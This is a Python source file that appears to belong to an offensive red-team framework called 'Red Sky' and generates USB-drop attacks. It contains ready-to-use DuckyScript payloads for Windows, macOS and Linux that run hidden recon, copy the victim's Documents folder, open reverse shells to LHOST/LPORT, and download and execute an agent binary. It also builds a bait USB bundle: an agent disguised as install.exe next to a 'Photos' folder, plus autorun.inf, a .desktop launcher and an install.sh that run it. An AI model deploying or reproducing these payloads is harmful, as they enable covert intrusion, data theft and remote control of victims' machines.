# language: Python, file: Program/physical/usb_drop.py, target: Red Sky physical — USB drop
# Two delivery paths:
#
#   1. DuckyScript generation. Emits a payload script for a Rubber Ducky /
#      BadUSB / O.MG cable. Pre-built templates for recon, exfil, reverse
#      shell — target-by-target key syntax (WIN for Windows GUI key, etc.).
#      If `duckencoder.py` is on PATH, compiles to inject.bin.
#
#   2. Plain USB drive bundle. Generates autorun.inf (Windows), .desktop +
#      launcher scripts (Linux), and a README-as-bait file name. The payload
#      is the redsky-agent binary plus a shell script that runs it.

import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DROP_DIR = OUTPUT_DIR / "physical" / "usb_drop"


# ── DuckyScript templates ───────────────────────────────────────────────────
# Line prefixes:
#   WIN / COMMAND / CTRL / ALT / SHIFT    — modifier keys
#   STRING                                — type literal text
#   DELAY                                 — ms
#   ENTER / TAB / ESC / GUI r / etc.      — named keys
#
# Target-specific: open-run-dialog shortcut differs per OS. Windows: GUI r.
# macOS: CMD SPACE. Linux: CTRL ALT t (gnome-terminal default).

TEMPLATES: Dict[str, Dict] = {
    "recon": {
        "title": "Recon — pull hostname, user, IP, OS, save to D:",
        "payloads": {
            "windows": """DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -ep bypass -c "$o='D:\recon.txt'; \"host: $(hostname)\" | Out-File $o; \"user: $env:USERNAME\" | Out-File $o -Append; \"ip: $((ipconfig | Select-String IPv4) -join ';')\" | Out-File $o -Append; \"os: $((Get-CimInstance Win32_OperatingSystem).Caption)\" | Out-File $o -Append; \"admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))\" | Out-File $o -Append"
ENTER
""",
            "macos": """DELAY 1500
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 800
STRING ( hostname; whoami; ifconfig | grep 'inet ' ; sw_vers -productVersion ) > /Volumes/USB/recon.txt
ENTER
""",
            "linux": """DELAY 1500
CTRL ALT t
DELAY 800
STRING ( hostname; whoami; hostname -I ; uname -a ) > /media/*/USB/recon.txt
ENTER
""",
        },
    },
    "exfil": {
        "title": "Exfil — copy documents folder to drop drive",
        "payloads": {
            "windows": """DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -ep bypass -c "$d=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'}).DriveLetter; if($d){ Copy-Item -Recurse -Force \\\"$env:USERPROFILE\\Documents\\*\\\" \\\"${d}:\\exfil\\\" }"
ENTER
""",
            "macos": """DELAY 1500
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 800
STRING cp -R ~/Documents/ /Volumes/USB/exfil/
ENTER
""",
            "linux": """DELAY 1500
CTRL ALT t
DELAY 800
STRING cp -R ~/Documents/ /media/*/USB/exfil/
ENTER
""",
        },
    },
    "reverse_shell": {
        "title": "Reverse shell — powershell one-liner / bash tcp",
        "payloads": {
            "windows": """DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/shell.ps1')"
ENTER
""",
            "macos": """DELAY 1500
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 800
STRING bash -i >& /dev/tcp/LHOST/LPORT 0>&1
ENTER
""",
            "linux": """DELAY 1500
CTRL ALT t
DELAY 800
STRING bash -i >& /dev/tcp/LHOST/LPORT 0>&1
ENTER
""",
        },
    },
    "redsky_agent": {
        "title": "Red Sky agent — download + execute the framework agent",
        "payloads": {
            "windows": """DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -ep bypass -c "iwr http://LHOST:LPORT/redsky-agent.exe -OutFile $env:TEMP\r.exe; Start-Process $env:TEMP\r.exe -ArgumentList '-core LHOST:LPORT -ca-fingerprint CAFP'"
ENTER
""",
            "macos": """DELAY 1500
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 800
STRING curl -fsSL http://LHOST:LPORT/redsky-agent -o /tmp/ra && chmod +x /tmp/ra && /tmp/ra -core LHOST:LPORT -ca-fingerprint CAFP
ENTER
""",
            "linux": """DELAY 1500
CTRL ALT t
DELAY 800
STRING curl -fsSL http://LHOST:LPORT/redsky-agent -o /tmp/ra && chmod +x /tmp/ra && /tmp/ra -core LHOST:LPORT -ca-fingerprint CAFP
ENTER
""",
        },
    },
}


# ── helpers ─────────────────────────────────────────────────────────────────

def _duckencoder() -> Optional[str]:
    for n in ("duckencoder.py", "duckencoder"):
        p = shutil.which(n)
        if p:
            return p
    return None


def _substitute(payload: str, vars_: Dict[str, str]) -> str:
    for k, v in vars_.items():
        payload = payload.replace(k, v)
    return payload


# ── commands ────────────────────────────────────────────────────────────────

def cmd_list() -> int:
    print_info("usb_drop — available DuckyScript templates")
    print()
    for key, t in TEMPLATES.items():
        targets = ",".join(t["payloads"].keys())
        print("  " + SCARLET + key.ljust(16) + RESET + " " + BONE + t["title"] + RESET)
        print("      targets: " + ASH + targets + RESET)
    print()
    print_info("run:  redsky physical usb_drop script <template> --target windows --lhost 10.0.0.1 --lport 4444")
    return 0


def cmd_script(template: str, target: str, lhost: str, lport: str, cafp: str, out: str, compile_: bool) -> int:
    if template not in TEMPLATES:
        print_err("unknown template: " + template)
        return 1
    t = TEMPLATES[template]
    if target not in t["payloads"]:
        print_err("target not available for " + template + ": " + target)
        return 1

    payload = t["payloads"][target]
    payload = _substitute(payload, {
        "LHOST": lhost or "LHOST",
        "LPORT": lport or "LPORT",
        "CAFP": cafp or "CAFP",
    })

    DROP_DIR.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    out_path = Path(out) if out else DROP_DIR / (template + "_" + target + "_" + ts + ".txt")
    out_path.write_text(payload)

    print_ok("payload written: " + str(out_path))
    print_kv("template", template)
    print_kv("target", target)
    print_kv("bytes", len(payload))
    if lhost:
        print_kv("lhost", lhost)
    if lport:
        print_kv("lport", lport)
    print()

    de = _duckencoder()
    if compile_:
        if not de:
            print_warn("duckencoder.py not on PATH — install from github.com/hak5darren/USB-Rubber-Ducky/encoder")
            print_warn("the .txt payload works on any text-paste-capable device as-is")
        else:
            bin_path = out_path.with_suffix(".bin")
            rc, so, se = _run([sys.executable, de, "-i", str(out_path), "-o", str(bin_path)], timeout=30)
            if rc == 0 and bin_path.exists():
                print_ok("inject.bin written: " + str(bin_path))
            else:
                print_err("duckencoder rc=" + str(rc))
                if se:
                    print_warn(se.strip())
    return 0


def _run(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return 127, "", str(e)


def cmd_bundle(agent_path: str, bait_name: str, core_addr: str, cafp: str, out_dir: str) -> int:
    """Build a plain USB drive bundle: autorun.inf, .desktop, agent binary, bait file."""
    if not agent_path:
        print_err("--agent <path to redsky-agent binary> is required")
        return 1
    agent = Path(agent_path)
    if not agent.exists():
        print_err("agent binary not found: " + agent_path)
        return 1

    d = Path(out_dir) if out_dir else DROP_DIR / ("bundle_" + time.strftime("%Y%m%d_%H%M%S"))
    d.mkdir(parents=True, exist_ok=True)

    bait = bait_name or "Photos"
    bait_dir = d / bait
    bait_dir.mkdir(exist_ok=True)
    (bait_dir / "readme.txt").write_text("See install.exe for viewer.\n")

    # copy agent next to bait
    dst_agent = d / "install.exe"
    shutil.copy(agent, dst_agent)
    try:
        os.chmod(dst_agent, 0o755)
    except Exception:
        pass

    args = "-core " + core_addr if core_addr else "-core LHOST:LPORT"
    if cafp:
        args += " -ca-fingerprint " + cafp

    # Windows autorun.inf (modern Windows ignores AutoRun for removable
    # media, but some corporate images and all pre-Win7 still honor it —
    # the .lnk / .exe drag is what actually works on Win10/11)
    (d / "autorun.inf").write_text(
        "[AutoRun]\n"
        "open=install.exe " + args + "\n"
        "icon=install.exe\n"
    )

    # Linux .desktop — works if the drop drive is mounted with exec and the
    # user double-clicks. Ugly but harmless.
    (d / "click_me.desktop").write_text(
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=Open " + bait + "\n"
        "Exec=sh -c '" + str(dst_agent) + " " + args + "'\n"
        "Terminal=false\n"
    )

    # Linux shell drop in bait folder
    (bait_dir / "install.sh").write_text(
        "#!/bin/sh\n"
        "\"$(dirname \"$0\")/../install.exe\" " + args + " &\n"
    )
    try:
        os.chmod(bait_dir / "install.sh", 0o755)
    except Exception:
        pass

    print_ok("usb bundle written: " + str(d))
    print_kv("agent", dst_agent)
    print_kv("bait", bait)
    print_kv("core_args", args)
    print()
    print_info("NOTE: modern Windows (7+) ignores autorun.inf for removable media.")
    print_info("      the .lnk dropper is what works — generate one with:")
    print_info("      redsky physical usb_drop lnk --target " + str(dst_agent) + " --args '" + args + "'")
    return 0


# ── cli ─────────────────────────────────────────────────────────────────────

def run_cli(args):
    import argparse
    sub = args[0] if args else "list"
    rest = args[1:] if args else []

    if sub in ("-h", "--help"):
        print_info("redsky physical usb_drop <sub-command>")
        print_info("")
        print_info("  list                                 show DuckyScript templates")
        print_info("  script <template> --target <os> [--lhost LHOST] [--lport LPORT]")
        print_info("         [--cafp FP] [--out FILE] [--compile]")
        print_info("      generate (and optionally compile) a DuckyScript payload")
        print_info("  bundle --agent FILE [--bait NAME] [--core HOST:PORT] [--cafp FP] [--out DIR]")
        print_info("      build a USB drive bundle: autorun.inf + .desktop + agent binary")
        return 0

    if sub == "list":
        return cmd_list()

    if sub == "script":
        p = argparse.ArgumentParser(prog="redsky physical usb_drop script", add_help=False)
        p.add_argument("template")
        p.add_argument("--target", default="windows", choices=["windows", "macos", "linux"])
        p.add_argument("--lhost", default="")
        p.add_argument("--lport", default="")
        p.add_argument("--cafp", default="")
        p.add_argument("--out", default="")
        p.add_argument("--compile", action="store_true")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky physical usb_drop script <template> --target windows [...]")
            return 2
        return cmd_script(ns.template, ns.target, ns.lhost, ns.lport, ns.cafp, ns.out, ns.compile)

    if sub == "bundle":
        p = argparse.ArgumentParser(prog="redsky physical usb_drop bundle", add_help=False)
        p.add_argument("--agent", required=False, default="")
        p.add_argument("--bait", default="")
        p.add_argument("--core", default="")
        p.add_argument("--cafp", default="")
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky physical usb_drop bundle --agent FILE [...]")
            return 2
        return cmd_bundle(ns.agent, ns.bait, ns.core, ns.cafp, ns.out)

    print_err("unknown usb_drop sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
